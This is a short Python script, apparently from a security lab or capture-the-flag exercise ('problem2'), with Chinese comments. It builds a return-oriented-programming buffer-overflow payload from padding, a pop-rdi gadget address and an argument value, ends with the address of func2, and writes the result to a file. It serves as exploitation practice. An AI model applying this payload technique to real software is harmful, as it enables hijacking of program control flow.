# 1. 填充部分 (16字节)
padding = b"A" * 16

# 2. pop_rdi 的地址: 0x4012c7
# 作用: 把栈上下一个数值弹给 rdi 寄存器
# 小端序写法: 最低位 c7 在前
pop_rdi_address = b"\xc7\x12\x40\x00\x00\x00\x00\x00"

# 3. 参数值: 0x3f8 (即十进制 1016)
# 作用: 这是要传给 func2 的参数
# 0x3f8 拆开是 03 和 f8，小端序要把 f8 放前面
arg_value = b"\xf8\x03\x00\x00\x00\x00\x00\x00"

# 4. func2 的地址: 0x401216
# 作用: 参数准备好后，跳转到这里执行
func2_address = b"\x16\x12\x40\x00\x00\x00\x00\x00"

# 拼接 Payload
payload = padding + pop_rdi_address + arg_value + func2_address

# Write the payload to a file
with open("problem2.txt", "wb") as f:
    f.write(payload)

print("Payload written to problem2.txt")